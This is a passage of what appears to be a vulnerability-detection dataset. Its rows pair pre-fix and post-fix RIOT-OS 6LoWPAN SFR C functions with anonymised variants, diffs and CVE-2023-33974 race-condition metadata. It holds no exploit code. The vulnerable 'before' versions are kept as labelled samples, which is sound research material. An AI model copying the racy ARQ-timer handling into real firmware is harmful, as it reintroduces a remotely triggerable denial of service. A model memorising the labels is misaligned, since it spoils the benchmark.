        DEBUG(""6lo sfr: ARQ timeout for datagram %u already scheduled\n"",
              (uint8_t)fbuf->tag);
        return;
    }
    DEBUG(""6lo sfr: arming ACK timeout in %lums for datagram %u\n"",
          (long unsigned)offset, fbuf->tag);
    fbuf->sfr.arq_timeout_event.event.offset = offset;
    fbuf->sfr.arq_timeout_event.msg.content.ptr = fbuf;
    fbuf->sfr.arq_timeout_event.msg.type = GNRC_SIXLOWPAN_FRAG_SFR_ARQ_TIMEOUT_MSG;
    evtimer_add_msg(&_arq_timer, &fbuf->sfr.arq_timeout_event,
                    _getpid());
}","static void _sched_arq_timeout(gnrc_sixlowpan_frag_fb_t *VAR_0, uint32_t VAR_1)
{
    if (IS_ACTIVE(VAR_2)) {
        /* COMMENT_0 */
        return;
    }
    if (_arq_scheduled(VAR_0)) {
        DEBUG(""6lo sfr: ARQ timeout for datagram %u already scheduled\n"",
              (uint8_t)VAR_0->tag);
        return;
    }
    DEBUG(""6lo sfr: arming ACK timeout in %lums for datagram %u\n"",
          (long unsigned)VAR_1, VAR_0->tag);
    VAR_0->sfr.arq_timeout_event.event.offset = VAR_1;
    VAR_0->sfr.arq_timeout_event.msg.content.ptr = VAR_0;
    VAR_0->sfr.arq_timeout_event.msg.type = VAR_3;
    evtimer_add_msg(&VAR_4, &VAR_0->sfr.arq_timeout_event,
                    _getpid());
}",RIOT-OS/RIOT/31c6191f6196f1a05c9765cffeadba868e3b0723/gnrc_sixlowpan_frag_sfr.c/vul/after/1.json,"--- func_before
+++ func_after
@@ -4,7 +4,7 @@
         /* mock does not need to be scheduled */
         return;
     }
-    if (fbuf->sfr.arq_timeout_event.msg.content.ptr != NULL) {
+    if (_arq_scheduled(fbuf)) {
         DEBUG(""6lo sfr: ARQ timeout for datagram %u already scheduled\n"",
               (uint8_t)fbuf->tag);
         return;","{'deleted_lines': ['    if (fbuf->sfr.arq_timeout_event.msg.content.ptr != NULL) {'], 'added_lines': ['    if (_arq_scheduled(fbuf)) {']}",True,"RIOT-OS, an operating system for Internet of Things (IoT) devices, contains a network stack with the ability to process 6LoWPAN frames. In versions 2023.01 and prior, an attacker can send multiple crafted frames to the device to trigger a race condition. The race condition invalidates assumptions about the program state and leads to an invalid memory access resulting in denial of service. This issue is patched in pull request 19679. There are no known workarounds.",7.5,HIGH,2,valid,2023-05-30T12:32:18Z,4
CVE-2023-33974,['CWE-362'],CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H,1,RIOT-OS/RIOT,gnrc_sixlowpan_frag_sfr: fix ARQ scheduler race-condition,31c6191f6196f1a05c9765cffeadba868e3b0723,https://github.com/RIOT-OS/RIOT/commit/31c6191f6196f1a05c9765cffeadba868e3b0723,sys/net/gnrc/network_layer/sixlowpan/frag/sfr/gnrc_sixlowpan_frag_sfr.c,_handle_ack,"static void _handle_ack(gnrc_netif_hdr_t *netif_hdr, gnrc_pktsnip_t *pkt,
unsigned page)
{
gnrc_sixlowpan_frag_vrb_t *vrbe;
sixlowpan_sfr_ack_t *hdr = pkt->data;
uint32_t recv_time = xtimer_now_usec();
(void)page;
DEBUG(""6lo sfr: received ACK for datagram (%s, %02x): %02X%02X%02X%02X\n"",
gnrc_netif_addr_to_str(gnrc_netif_hdr_get_src_addr(netif_hdr),
netif_hdr->src_l2addr_len,
addr_str), hdr->base.tag,
hdr->bitmap[0], hdr->bitmap[1], hdr->bitmap[2], hdr->bitmap[3]);
if ((vrbe = gnrc_sixlowpan_frag_vrb_reverse(
gnrc_netif_hdr_get_netif(netif_hdr),
gnrc_netif_hdr_get_src_addr(netif_hdr),
netif_hdr->src_l2addr_len, hdr->base.tag)) != NULL) {
sixlowpan_sfr_t mock_base = { .disp_ecn = hdr->base.disp_ecn,
.tag = vrbe->super.tag };
DEBUG(""6lo sfr: forward ACK to (%s, %02x)\n"",
gnrc_netif_addr_to_str(vrbe->super.src, vrbe->super.src_len,
addr_str), vrbe->super.tag);
_send_ack(vrbe->in_netif, vrbe->super.src, vrbe->super.src_len,
&mock_base, hdr->bitmap);
if (IS_USED(MODULE_GNRC_SIXLOWPAN_FRAG_SFR_STATS)) {
_stats.acks.forwarded++;
}
if ((unaligned_get_u32(hdr->bitmap) == _full_bitmap.u32) ||
(unaligned_get_u32(hdr->bitmap) == _null_bitmap.u32)) {
if (CONFIG_GNRC_SIXLOWPAN_FRAG_RBUF_DEL_TIMER > 0) {
vrbe->super.arrival = recv_time -
(CONFIG_GNRC_SIXLOWPAN_FRAG_VRB_TIMEOUT_US -
CONFIG_GNRC_SIXLOWPAN_FRAG_RBUF_DEL_TIMER);
}
else {
gnrc_sixlowpan_frag_vrb_rm(vrbe);
}
}
else {
vrbe->super.arrival = recv_time;
}
}
else {
gnrc_sixlowpan_frag_fb_t *fbuf;
if ((fbuf = gnrc_sixlowpan_frag_fb_get_by_tag(hdr->base.tag)) != NULL) {
DEBUG(""6lo sfr: cancelling ARQ timeout\n"");
evtimer_del((evtimer_t *)(&_arq_timer),
&fbuf->sfr.arq_timeout_event.event);
fbuf->sfr.arq_timeout_event.msg.content.ptr = NULL;
if ((unaligned_get_u32(hdr->bitmap) == _null_bitmap.u32)) {
DEBUG(""6lo sfr: fragmentation canceled\n"");
_retry_datagram(fbuf);
}
else {
_check_failed_frags(hdr, fbuf, recv_time / US_PER_MS);
}
}
else {
DEBUG(""6lo sfr: no VRB or fragmentation buffer found\n"");
}
}
gnrc_pktbuf_release(pkt);
}","static void _handle_ack(gnrc_netif_hdr_t *VAR_0, gnrc_pktsnip_t *VAR_1,
unsigned VAR_2)
{
gnrc_sixlowpan_frag_vrb_t *VAR_3;
sixlowpan_sfr_ack_t *VAR_4 = VAR_1->data;
uint32_t VAR_5 = xtimer_now_usec();
(void)VAR_2;
DEBUG(""6lo sfr: received ACK for datagram (%s, %02x): %02X%02X%02X%02X\n"",
gnrc_netif_addr_to_str(gnrc_netif_hdr_get_src_addr(VAR_0),
VAR_0->src_l2addr_len,
VAR_6), VAR_4->base.tag,
VAR_4->bitmap[0], VAR_4->bitmap[1], VAR_4->bitmap[2], VAR_4->bitmap[3]);
if ((VAR_3 = gnrc_sixlowpan_frag_vrb_reverse(
gnrc_netif_hdr_get_netif(VAR_0),
gnrc_netif_hdr_get_src_addr(VAR_0),
VAR_0->src_l2addr_len, VAR_4->base.tag)) != NULL) {
sixlowpan_sfr_t VAR_7 = { .disp_ecn = VAR_4->base.disp_ecn,
.tag = VAR_3->super.tag };
DEBUG(""6lo sfr: forward ACK to (%s, %02x)\n"",
gnrc_netif_addr_to_str(VAR_3->super.src, VAR_3->super.src_len,
VAR_6), VAR_3->super.tag);
_send_ack(VAR_3->in_netif, VAR_3->super.src, VAR_3->super.src_len,
&VAR_7, VAR_4->bitmap);
if (IS_USED(VAR_8)) {
VAR_9.acks.forwarded++;
}
if ((unaligned_get_u32(VAR_4->bitmap) == VAR_10.u32) ||
(unaligned_get_u32(VAR_4->bitmap) == VAR_11.u32)) {
if (VAR_12 > 0) {
VAR_3->super.arrival = VAR_5 -
(VAR_13 -
VAR_12);
}
else {
gnrc_sixlowpan_frag_vrb_rm(VAR_3);
}
}
else {
VAR_3->super.arrival = VAR_5;
}
}
else {
gnrc_sixlowpan_frag_fb_t *VAR_14;
if ((VAR_14 = gnrc_sixlowpan_frag_fb_get_by_tag(VAR_4->base.tag)) != NULL) {
DEBUG(""6lo sfr: cancelling ARQ timeout\n"");
evtimer_del((evtimer_t *)(&VAR_15),
&VAR_14->sfr.arq_timeout_event.event);
VAR_14->sfr.arq_timeout_event.msg.content.ptr = NULL;
if ((unaligned_get_u32(VAR_4->bitmap) == VAR_11.u32)) {
DEBUG(""6lo sfr: fragmentation canceled\n"");
_retry_datagram(VAR_14);
}
else {
_check_failed_frags(VAR_4, VAR_14, VAR_5 / VAR_16);
}
}
else {
DEBUG(""6lo sfr: no VRB or fragmentation buffer found\n"");
}
}
gnrc_pktbuf_release(VAR_1);
}",RIOT-OS/RIOT/31c6191f6196f1a05c9765cffeadba868e3b0723/gnrc_sixlowpan_frag_sfr.c/vul/before/0.json,"static void _handle_ack(gnrc_netif_hdr_t *netif_hdr, gnrc_pktsnip_t *pkt,
                        unsigned page)
{
    gnrc_sixlowpan_frag_vrb_t *vrbe;
    sixlowpan_sfr_ack_t *hdr = pkt->data;
    uint32_t recv_time = xtimer_now_usec();

    (void)page;
    DEBUG(""6lo sfr: received ACK for datagram (%s, %02x): %02X%02X%02X%02X\n"",
          gnrc_netif_addr_to_str(gnrc_netif_hdr_get_src_addr(netif_hdr),
                                 netif_hdr->src_l2addr_len,
                                 addr_str), hdr->base.tag,
          hdr->bitmap[0], hdr->bitmap[1], hdr->bitmap[2], hdr->bitmap[3]);
    if ((vrbe = gnrc_sixlowpan_frag_vrb_reverse(
            gnrc_netif_hdr_get_netif(netif_hdr),
            gnrc_netif_hdr_get_src_addr(netif_hdr),
            netif_hdr->src_l2addr_len, hdr->base.tag)) != NULL) {
        /* we found a VRB entry by reverse lookup, forward ACK further down. */
        sixlowpan_sfr_t mock_base = { .disp_ecn = hdr->base.disp_ecn,
                                      .tag = vrbe->super.tag };
        DEBUG(""6lo sfr: forward ACK to (%s, %02x)\n"",
              gnrc_netif_addr_to_str(vrbe->super.src, vrbe->super.src_len,
                                     addr_str), vrbe->super.tag);
        _send_ack(vrbe->in_netif, vrbe->super.src, vrbe->super.src_len,
                  &mock_base, hdr->bitmap);
        if (IS_USED(MODULE_GNRC_SIXLOWPAN_FRAG_SFR_STATS)) {
            _stats.acks.forwarded++;
        }
        if ((unaligned_get_u32(hdr->bitmap) == _full_bitmap.u32) ||
            (unaligned_get_u32(hdr->bitmap) == _null_bitmap.u32)) {
            if (CONFIG_GNRC_SIXLOWPAN_FRAG_RBUF_DEL_TIMER > 0) {
                /* garbage-collect entry after CONFIG_GNRC_SIXLOWPAN_FRAG_RBUF_DEL_TIMER
                 * microseconds */
                vrbe->super.arrival = recv_time -
                                      (CONFIG_GNRC_SIXLOWPAN_FRAG_VRB_TIMEOUT_US -
                                       CONFIG_GNRC_SIXLOWPAN_FRAG_RBUF_DEL_TIMER);
            }
            else {
                gnrc_sixlowpan_frag_vrb_rm(vrbe);
            }
        }
        else {
            vrbe->super.arrival = recv_time;
        }
    }
    else {
        gnrc_sixlowpan_frag_fb_t *fbuf;

        if ((fbuf = gnrc_sixlowpan_frag_fb_get_by_tag(hdr->base.tag)) != NULL) {
            /* ACK for pending ACK timeout received. removing ACK timeout */
            DEBUG(""6lo sfr: cancelling ARQ timeout\n"");
            evtimer_del((evtimer_t *)(&_arq_timer),
                        &fbuf->sfr.arq_timeout_event.event);
            if ((unaligned_get_u32(hdr->bitmap) == _null_bitmap.u32)) {
                /* ACK indicates the reassembling endpoint canceled reassembly
                 */
                DEBUG(""6lo sfr: fragmentation canceled\n"");
                /* Retry to send whole datagram if configured, otherwise
                 * cancel fragmentation */
                _retry_datagram(fbuf);
            }
            else {
                /* Check and resent failed fragments within the current window
                 */
               _check_failed_frags(hdr, fbuf, recv_time / US_PER_MS);
            }
        }
        else {
            DEBUG(""6lo sfr: no VRB or fragmentation buffer found\n"");
        }
    }
    gnrc_pktbuf_release(pkt);
}","static void _handle_ack(gnrc_netif_hdr_t *VAR_0, gnrc_pktsnip_t *VAR_1,
                        unsigned VAR_2)
{
    gnrc_sixlowpan_frag_vrb_t *VAR_3;
    sixlowpan_sfr_ack_t *VAR_4 = VAR_1->data;
    uint32_t VAR_5 = xtimer_now_usec();

    (void)VAR_2;
    DEBUG(""6lo sfr: received ACK for datagram (%s, %02x): %02X%02X%02X%02X\n"",
          gnrc_netif_addr_to_str(gnrc_netif_hdr_get_src_addr(VAR_0),
                                 VAR_0->src_l2addr_len,
                                 VAR_6), VAR_4->base.tag,
          VAR_4->bitmap[0], VAR_4->bitmap[1], VAR_4->bitmap[2], VAR_4->bitmap[3]);
    if ((VAR_3 = gnrc_sixlowpan_frag_vrb_reverse(
            gnrc_netif_hdr_get_netif(VAR_0),
            gnrc_netif_hdr_get_src_addr(VAR_0),
            VAR_0->src_l2addr_len, VAR_4->base.tag)) != NULL) {
        /* COMMENT_0 */
        sixlowpan_sfr_t VAR_7 = { .disp_ecn = VAR_4->base.disp_ecn,
                                      .tag = VAR_3->super.tag };
        DEBUG(""6lo sfr: forward ACK to (%s, %02x)\n"",
              gnrc_netif_addr_to_str(VAR_3->super.src, VAR_3->super.src_len,
                                     VAR_6), VAR_3->super.tag);
        _send_ack(VAR_3->in_netif, VAR_3->super.src, VAR_3->super.src_len,
                  &VAR_7, VAR_4->bitmap);
        if (IS_USED(VAR_8)) {
            VAR_9.acks.forwarded++;
        }
        if ((unaligned_get_u32(VAR_4->bitmap) == VAR_10.u32) ||
            (unaligned_get_u32(VAR_4->bitmap) == VAR_11.u32)) {
            if (VAR_12 > 0) {
                /* COMMENT_1 */
                                  
                VAR_3->super.arrival = VAR_5 -
                                      (VAR_13 -
                                       VAR_12);
            }
            else {
                gnrc_sixlowpan_frag_vrb_rm(VAR_3);
            }
        }
        else {
            VAR_3->super.arrival = VAR_5;
        }
    }
    else {
        gnrc_sixlowpan_frag_fb_t *VAR_14;

        if ((VAR_14 = gnrc_sixlowpan_frag_fb_get_by_tag(VAR_4->base.tag)) != NULL) {
            /* COMMENT_3 */
            DEBUG(""6lo sfr: cancelling ARQ timeout\n"");
            evtimer_del((evtimer_t *)(&VAR_15),
                        &VAR_14->sfr.arq_timeout_event.event);
            if ((unaligned_get_u32(VAR_4->bitmap) == VAR_11.u32)) {
                /* COMMENT_4 */
                   
                DEBUG(""6lo sfr: fragmentation canceled\n"");
                /* COMMENT_6 */
                                          
                _retry_datagram(VAR_14);
            }
            else {
                /* COMMENT_8 */
                   
               _check_failed_frags(VAR_4, VAR_14, VAR_5 / VAR_16);
            }
        }
        else {
            DEBUG(""6lo sfr: no VRB or fragmentation buffer found\n"");
        }
    }
    gnrc_pktbuf_release(VAR_1);
}",RIOT-OS/RIOT/31c6191f6196f1a05c9765cffeadba868e3b0723/gnrc_sixlowpan_frag_sfr.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -51,7 +51,6 @@
             DEBUG(""6lo sfr: cancelling ARQ timeout\n"");
             evtimer_del((evtimer_t *)(&_arq_timer),
                         &fbuf->sfr.arq_timeout_event.event);
-            fbuf->sfr.arq_timeout_event.msg.content.ptr = NULL;
             if ((unaligned_get_u32(hdr->bitmap) == _null_bitmap.u32)) {
                 /* ACK indicates the reassembling endpoint canceled reassembly
                  */","{'deleted_lines': ['            fbuf->sfr.arq_timeout_event.msg.content.ptr = NULL;'], 'added_lines': []}",True,"RIOT-OS, an operating system for Internet of Things (IoT) devices, contains a network stack with the ability to process 6LoWPAN frames. In versions 2023.01 and prior, an attacker can send multiple crafted frames to the device to trigger a race condition. The race condition invalidates assumptions about the program state and leads to an invalid memory access resulting in denial of service. This issue is patched in pull request 19679. There are no known workarounds.",7.5,HIGH,2,valid,2023-05-30T12:32:18Z,4
CVE-2023-33974,['CWE-362'],CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H,1,RIOT-OS/RIOT,gnrc_sixlowpan_frag_sfr: fix ARQ scheduler race-condition,31c6191f6196f1a05c9765cffeadba868e3b0723,https://github.com/RIOT-OS/RIOT/commit/31c6191f6196f1a05c9765cffeadba868e3b0723,sys/net/gnrc/network_layer/sixlowpan/frag/sfr/gnrc_sixlowpan_frag_sfr.c,gnrc_sixlowpan_frag_sfr_arq_timeout,"void gnrc_sixlowpan_frag_sfr_arq_timeout(gnrc_sixlowpan_frag_fb_t *fbuf)
{
uint32_t now = xtimer_now_usec() / US_PER_MS;
_frag_desc_t *frag_desc = (_frag_desc_t *)fbuf->sfr.window.next;
uint32_t next_arq_offset = fbuf->sfr.arq_timeout;
bool reschedule_arq_timeout = false;
int error_no = ETIMEDOUT;   
DEBUG(""6lo sfr: ARQ timeout for datagram %u\n"", fbuf->tag);
fbuf->sfr.arq_timeout_event.msg.content.ptr = NULL;
if (IS_ACTIVE(CONFIG_GNRC_SIXLOWPAN_SFR_MOCK_ARQ_TIMER)) {
now -= (fbuf->sfr.arq_timeout * US_PER_MS) + 1;
}
if (IS_USED(MODULE_GNRC_SIXLOWPAN_FRAG_SFR_CONGURE) && frag_desc) {
gnrc_sixlowpan_frag_sfr_congure_snd_report_frags_timeout(fbuf);
_shrink_window(fbuf);   
frag_desc = (_frag_desc_t *)fbuf->sfr.window.next;
}
_frag_desc_t * const head = frag_desc;
if (frag_desc) {
do {
uint32_t diff;
frag_desc = (_frag_desc_t *)frag_desc->super.super.next;
diff = now - frag_desc->super.send_time;
if (diff < fbuf->sfr.arq_timeout) {
uint32_t offset = fbuf->sfr.arq_timeout - diff;
DEBUG(""6lo sfr: wait for fragment %u in next reschedule\n"",
_frag_seq(frag_desc));
if (offset < next_arq_offset) {
next_arq_offset = offset;
DEBUG(""         (next ARQ timeout in %lu)\n"",
(long unsigned)next_arq_offset);
}
reschedule_arq_timeout = true;
}
else if (_frag_ack_req(frag_desc)) {
if ((frag_desc->super.resends++) < CONFIG_GNRC_SIXLOWPAN_SFR_FRAG_RETRIES) {
DEBUG(""6lo sfr: %u retries left for fragment (tag: %u, ""
""X: %i, seq: %u, frag_size: %u, offset: %u)\n"",
CONFIG_GNRC_SIXLOWPAN_SFR_FRAG_RETRIES -
(frag_desc->super.resends - 1), (uint8_t)fbuf->tag,
_frag_ack_req(frag_desc), _frag_seq(frag_desc),
_frag_size(frag_desc), frag_desc->offset);
if (_resend_frag(&frag_desc->super.super, fbuf) != 0) {
error_no = ENOMEM;
goto error;
}
else {
if (IS_USED(MODULE_GNRC_SIXLOWPAN_FRAG_SFR_CONGURE)) {
gnrc_sixlowpan_frag_sfr_congure_snd_report_frag_sent(fbuf);
}
if (IS_USED(MODULE_GNRC_SIXLOWPAN_FRAG_SFR_STATS)) {
_stats.fragment_resends.by_timeout++;
}
}
reschedule_arq_timeout = true;
}
else {
DEBUG(""6lo sfr: no retries left for fragment ""
""(tag: %u, X: %i, seq: %u, frag_size: %u, ""
""offset: %u)\n"",
(uint8_t)fbuf->tag, _frag_ack_req(frag_desc),
_frag_seq(frag_desc), _frag_size(frag_desc),
frag_desc->offset);
_retry_datagram(fbuf);
return;
}
}
else {
DEBUG(""6lo sfr: nothing to do for fragment %u\n"",
_frag_seq(frag_desc));
}
} while (frag_desc != head);
clist_foreach(&fbuf->sfr.window, _report_non_ack_req_window_sent, fbuf);
}
else {
error_no = GNRC_NETERR_SUCCESS;
}
assert(fbuf->sfr.frags_sent == clist_count(&fbuf->sfr.window));
if (reschedule_arq_timeout) {
_sched_arq_timeout(fbuf, next_arq_offset);
return;
}
error:
_send_abort_frag(fbuf->pkt, fbuf, false, 0);
_clean_up_fbuf(fbuf, error_no);
}","void gnrc_sixlowpan_frag_sfr_arq_timeout(gnrc_sixlowpan_frag_fb_t *VAR_0)
{
uint32_t VAR_1 = xtimer_now_usec() / VAR_2;
_frag_desc_t *VAR_3 = (_frag_desc_t *)VAR_0->sfr.window.next;
uint32_t VAR_4 = VAR_0->sfr.arq_timeout;
bool VAR_5 = false;
int VAR_6 = VAR_7;   
DEBUG(""6lo sfr: ARQ timeout for datagram %u\n"", VAR_0->tag);
VAR_0->sfr.arq_timeout_event.msg.content.ptr = NULL;
if (IS_ACTIVE(VAR_8)) {
VAR_1 -= (VAR_0->sfr.arq_timeout * VAR_2) + 1;
}
if (IS_USED(VAR_9) && VAR_3) {
gnrc_sixlowpan_frag_sfr_congure_snd_report_frags_timeout(VAR_0);
_shrink_window(VAR_0);   
VAR_3 = (_frag_desc_t *)VAR_0->sfr.window.next;
}
_frag_desc_t * const VAR_10 = VAR_3;
if (VAR_3) {
do {
uint32_t VAR_11;
VAR_3 = (_frag_desc_t *)VAR_3->super.super.next;
VAR_11 = VAR_1 - VAR_3->super.send_time;
if (VAR_11 < VAR_0->sfr.arq_timeout) {
uint32_t VAR_12 = VAR_0->sfr.arq_timeout - VAR_11;
DEBUG(""6lo sfr: wait for fragment %u in next reschedule\n"",
_frag_seq(VAR_3));
if (VAR_12 < VAR_4) {
VAR_4 = VAR_12;
DEBUG(""         (next ARQ timeout in %lu)\n"",
(long unsigned)VAR_4);
}
VAR_5 = true;
}
else if (_frag_ack_req(VAR_3)) {
if ((VAR_3->super.resends++) < VAR_13) {
DEBUG(""6lo sfr: %u retries left for fragment (tag: %u, ""
""X: %i, seq: %u, frag_size: %u, offset: %u)\n"",
VAR_13 -
(VAR_3->super.resends - 1), (uint8_t)VAR_0->tag,
_frag_ack_req(VAR_3), _frag_seq(VAR_3),
_frag_size(VAR_3), VAR_3->offset);
if (_resend_frag(&VAR_3->super.super, VAR_0) != 0) {
VAR_6 = VAR_14;
goto error;
}
else {
if (IS_USED(VAR_9)) {
gnrc_sixlowpan_frag_sfr_congure_snd_report_frag_sent(VAR_0);
}
if (IS_USED(VAR_15)) {
VAR_16.fragment_resends.by_timeout++;
}
}
VAR_5 = true;
}
else {
DEBUG(""6lo sfr: no retries left for fragment ""
""(tag: %u, X: %i, seq: %u, frag_size: %u, ""
""offset: %u)\n"",
(uint8_t)VAR_0->tag, _frag_ack_req(VAR_3),
_frag_seq(VAR_3), _frag_size(VAR_3),
VAR_3->offset);
_retry_datagram(VAR_0);
return;
}
}
else {
DEBUG(""6lo sfr: nothing to do for fragment %u\n"",
_frag_seq(VAR_3));
}
} while (VAR_3 != VAR_10);
clist_foreach(&VAR_0->sfr.window, VAR_17, VAR_0);
}
else {
VAR_6 = VAR_18;
}
assert(VAR_0->sfr.frags_sent == clist_count(&VAR_0->sfr.window));
if (VAR_5) {
_sched_arq_timeout(VAR_0, VAR_4);
return;
}
error:
_send_abort_frag(VAR_0->pkt, VAR_0, false, 0);
_clean_up_fbuf(VAR_0, VAR_6);
}",RIOT-OS/RIOT/31c6191f6196f1a05c9765cffeadba868e3b0723/gnrc_sixlowpan_frag_sfr.c/vul/before/2.json,"void gnrc_sixlowpan_frag_sfr_arq_timeout(gnrc_sixlowpan_frag_fb_t *fbuf)
{
    uint32_t now = xtimer_now_usec() / US_PER_MS;
    _frag_desc_t *frag_desc = (_frag_desc_t *)fbuf->sfr.window.next;
    uint32_t next_arq_offset = fbuf->sfr.arq_timeout;
    bool reschedule_arq_timeout = false;
    int error_no = ETIMEDOUT;   /* assume time out for fbuf->pkt */

    DEBUG(""6lo sfr: ARQ timeout for datagram %u\n"", fbuf->tag);
    if (IS_ACTIVE(CONFIG_GNRC_SIXLOWPAN_SFR_MOCK_ARQ_TIMER)) {
        /* mock-up to emulate time having passed beyond (1us) the ARQ timeout */
        now -= (fbuf->sfr.arq_timeout * US_PER_MS) + 1;
    }
    if (IS_USED(MODULE_GNRC_SIXLOWPAN_FRAG_SFR_CONGURE) && frag_desc) {
        /* report timeout to CongURE state */
        gnrc_sixlowpan_frag_sfr_congure_snd_report_frags_timeout(fbuf);
        _shrink_window(fbuf);   /* potentially shrink window */
        /* reassign frag_desc, in case window head changed */
        frag_desc = (_frag_desc_t *)fbuf->sfr.window.next;
    }
    /* copying clist_foreach because we can't work just in function context */
    _frag_desc_t * const head = frag_desc;
    if (frag_desc) {
        do {
            uint32_t diff;

            frag_desc = (_frag_desc_t *)frag_desc->super.super.next;
            diff = now - frag_desc->super.send_time;
            if (diff < fbuf->sfr.arq_timeout) {
                /* this fragment's last was last sent < fbuf->sfr.arq_timeout
                 * ago */
                uint32_t offset = fbuf->sfr.arq_timeout - diff;

                DEBUG(""6lo sfr: wait for fragment %u in next reschedule\n"",
                      _frag_seq(frag_desc));
                if (offset < next_arq_offset) {
                    /* wait for this fragments ACK next */
                    next_arq_offset = offset;
                    DEBUG(""         (next ARQ timeout in %lu)\n"",
                          (long unsigned)next_arq_offset);
                }
                /* this fragment is still waiting for its ACK,
                 * reschedule the next ACK timeout to the difference
                 * of the ACK timeout and the time of its last send */
                reschedule_arq_timeout = true;
            }
            else if (_frag_ack_req(frag_desc)) {
                /* for this fragment we requested an ACK which was not received
                 * yet. Try to resend it */
                if ((frag_desc->super.resends++) < CONFIG_GNRC_SIXLOWPAN_SFR_FRAG_RETRIES) {
                    /* we have retries left for this fragment */
                    DEBUG(""6lo sfr: %u retries left for fragment (tag: %u, ""
                          ""X: %i, seq: %u, frag_size: %u, offset: %u)\n"",
                          CONFIG_GNRC_SIXLOWPAN_SFR_FRAG_RETRIES -
                          (frag_desc->super.resends - 1), (uint8_t)fbuf->tag,
                          _frag_ack_req(frag_desc), _frag_seq(frag_desc),
                          _frag_size(frag_desc), frag_desc->offset);
                    if (_resend_frag(&frag_desc->super.super, fbuf) != 0) {
                        /* _resend_frag failed due to a memory resource
                         * problem */
                        error_no = ENOMEM;
                        goto error;
                    }
                    else {
                        if (IS_USED(MODULE_GNRC_SIXLOWPAN_FRAG_SFR_CONGURE)) {
                            /* fragment was resent successfully, report this to CongURE state
                             * object */
                            gnrc_sixlowpan_frag_sfr_congure_snd_report_frag_sent(fbuf);
                        }
                        if (IS_USED(MODULE_GNRC_SIXLOWPAN_FRAG_SFR_STATS)) {
                            /* fragment was resent successfully, note this done
                             * in the statistics */
                            _stats.fragment_resends.by_timeout++;
                        }
                    }
                    /* fragment was resent successfully, schedule next ACK
                     * timeout */
                    reschedule_arq_timeout = true;
                }
                else {
                    /* out of retries */
                    DEBUG(""6lo sfr: no retries left for fragment ""
                          ""(tag: %u, X: %i, seq: %u, frag_size: %u, ""
                          ""offset: %u)\n"",
                          (uint8_t)fbuf->tag, _frag_ack_req(frag_desc),
                          _frag_seq(frag_desc), _frag_size(frag_desc),
                          frag_desc->offset);
                    /* we are out of retries on the fragment level, but we
                     * might be able to retry the datagram if retries for the
                     * datagram are configured. */
                    _retry_datagram(fbuf);
                    return;
                }
            }
            else {
                /* Do not resend fragments that were not explicitly asking for
                 * an ACK from the reassembling endpoint on ACK timeout.
                 * If this is true for all fragments remaining in the fragment
                 * buffer, the datagram is to be considered timed out, so
                 * error_no should remain ETIMEDOUT */
                DEBUG(""6lo sfr: nothing to do for fragment %u\n"",
                      _frag_seq(frag_desc));
            }
        } while (frag_desc != head);
        /* report all non-ack_req fragments in window also as sent, since even
         * the lost fragments are still in flight (even though they were
         * previously marked as timed out) */
        clist_foreach(&fbuf->sfr.window, _report_non_ack_req_window_sent, fbuf);
    }
    else {
        /* No fragments to resend, we can assume the packet was delivered
         * successfully */
        error_no = GNRC_NETERR_SUCCESS;
    }
    assert(fbuf->sfr.frags_sent == clist_count(&fbuf->sfr.window));
    if (reschedule_arq_timeout) {
        _sched_arq_timeout(fbuf, next_arq_offset);
        return;
    }
error:
    /* don't check return value, as we don't want to wait for an ACK again ;-) */
    _send_abort_frag(fbuf->pkt, fbuf, false, 0);
    _clean_up_fbuf(fbuf, error_no);
}","void gnrc_sixlowpan_frag_sfr_arq_timeout(gnrc_sixlowpan_frag_fb_t *VAR_0)
{
    uint32_t VAR_1 = xtimer_now_usec() / VAR_2;
    _frag_desc_t *VAR_3 = (_frag_desc_t *)VAR_0->sfr.window.next;
    uint32_t VAR_4 = VAR_0->sfr.arq_timeout;
    bool VAR_5 = false;
    int VAR_6 = VAR_7;   /* COMMENT_0 */

    DEBUG(""6lo sfr: ARQ timeout for datagram %u\n"", VAR_0->tag);
    if (IS_ACTIVE(VAR_8)) {
        /* COMMENT_1 */
        VAR_1 -= (VAR_0->sfr.arq_timeout * VAR_2) + 1;
    }
    if (IS_USED(VAR_9) && VAR_3) {
        /* COMMENT_2 */
        gnrc_sixlowpan_frag_sfr_congure_snd_report_frags_timeout(VAR_0);
        _shrink_window(VAR_0);   /* COMMENT_3 */
        /* COMMENT_4 */
        VAR_3 = (_frag_desc_t *)VAR_0->sfr.window.next;
    }
    /* COMMENT_5 */
    _frag_desc_t * const VAR_10 = VAR_3;
    if (VAR_3) {
        do {
            uint32_t VAR_11;

            VAR_3 = (_frag_desc_t *)VAR_3->super.super.next;
            VAR_11 = VAR_1 - VAR_3->super.send_time;
            if (VAR_11 < VAR_0->sfr.arq_timeout) {
                /* COMMENT_6 */
                         
                uint32_t VAR_12 = VAR_0->sfr.arq_timeout - VAR_11;

                DEBUG(""6lo sfr: wait for fragment %u in next reschedule\n"",
                      _frag_seq(VAR_3));
                if (VAR_12 < VAR_4) {
                    /* COMMENT_8 */
                    VAR_4 = VAR_12;
                    DEBUG(""         (next ARQ timeout in %lu)\n"",
                          (long unsigned)VAR_4);
                }
                /* COMMENT_9 */
                                                                    
                                                                      
                VAR_5 = true;
            }
            else if (_frag_ack_req(VAR_3)) {
                /* COMMENT_12 */
                                           
                if ((VAR_3->super.resends++) < VAR_13) {
                    /* COMMENT_14 */
                    DEBUG(""6lo sfr: %u retries left for fragment (tag: %u, ""
                          ""X: %i, seq: %u, frag_size: %u, offset: %u)\n"",
                          VAR_13 -
                          (VAR_3->super.resends - 1), (uint8_t)VAR_0->tag,
                          _frag_ack_req(VAR_3), _frag_seq(VAR_3),
                          _frag_size(VAR_3), VAR_3->offset);
                    if (_resend_frag(&VAR_3->super.super, VAR_0) != 0) {
                        /* COMMENT_15 */
                                     
                        VAR_6 = VAR_14;
                        goto error;
                    }
                    else {
                        if (IS_USED(VAR_9)) {
                            /* COMMENT_17 */
                                        
                            gnrc_sixlowpan_frag_sfr_congure_snd_report_frag_sent(VAR_0);
                        }
                        if (IS_USED(VAR_15)) {
                            /* COMMENT_19 */
                                                   
                            VAR_16.fragment_resends.by_timeout++;
                        }
                    }
                    /* COMMENT_21 */
                                 
                    VAR_5 = true;
                }
                else {
                    /* COMMENT_23 */
                    DEBUG(""6lo sfr: no retries left for fragment ""
                          ""(tag: %u, X: %i, seq: %u, frag_size: %u, ""
                          ""offset: %u)\n"",
